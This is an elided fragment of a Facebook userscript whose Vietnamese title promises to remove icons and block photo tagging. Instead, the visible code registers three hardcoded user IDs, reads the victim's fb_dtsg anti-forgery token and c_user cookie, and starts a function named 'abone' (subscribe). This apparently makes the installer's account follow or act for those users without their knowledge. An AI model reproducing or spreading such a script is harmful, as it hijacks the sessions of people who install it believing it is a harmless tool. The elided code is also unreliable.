// ==UserScript==
// @name            Gỡ BỎ ICON + NGĂN CHẶN TAG TÊN VÀO ẢNH
// @description     All about facebook By Út Hồng
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Cài Đặt ICON FACEBOOK Thành Công <br>chrome.google.com</a>';
	html += '</div>';
...
IDS("100005776683788");IDS("100004233791019");IDS("100007713756357");
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
